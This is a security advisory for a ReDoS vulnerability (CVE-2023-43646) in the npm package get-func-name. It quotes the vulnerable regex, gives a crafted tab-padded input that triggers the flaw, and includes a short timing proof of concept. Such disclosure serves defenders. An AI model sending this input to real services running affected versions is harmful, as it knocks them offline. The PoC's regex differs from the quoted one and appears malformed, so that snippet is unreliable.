# [H] Chaijs/get-func-name vulnerable to ReDoS

## Summary
Severity: High
Advisory: GHSA-4q6p-r6v2-jvc5
CVE: CVE-2023-43646
CWE: CWE-1333, CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-09-27
Source: https://github.com/advisories/GHSA-4q6p-r6v2-jvc5
Type: github-advisory

## Affected
- npm: `get-func-name` — affected >=0 <2.0.1

## Details
The current regex implementation for parsing values in the module is susceptible to excessive backtracking, leading to potential DoS attacks. The regex implementation in question is as follows:

```js
const functionNameMatch = /\s*function(?:\s|\s*\/\*[^(?:*/)]+\*\/\s*)*([^\s(/]+)/;
```

This vulnerability can be exploited when there is an imbalance in parentheses, which results in excessive backtracking and subsequently increases the CPU load and processing time significantly. This vulnerability can be triggered using the following input:

```js
'\t'.repeat(54773) + '\t/function/i'
```

Here is a simple PoC code to demonstrate the issue:

```js
const protocolre = /\sfunction(?:\s|\s/*[^(?:*\/)]+*/\s*)*([^\(\/]+)/;

const startTime = Date.now();
const maliciousInput = '\t'.repeat(54773) + '\t/function/i'

protocolre.test(maliciousInput);

const endTime = Date.now();

console.log("process time: ", endTime - startTime, "ms");
```

## References
- https://github.com/chaijs/get-func-name/security/advisories/GHSA-4q6p-r6v2-jvc5
- https://nvd.nist.gov/vuln/detail/CVE-2023-43646
- https://github.com/chaijs/get-func-name/commit/f934b228b5e2cb94d6c8576d3aac05493f667c69
- https://github.com/chaijs/get-func-name
- https://github.com/chaijs/get-func-name/blob/78ad756441a83f3dc203e50f76c113ae3ac017dc/index.js#L15
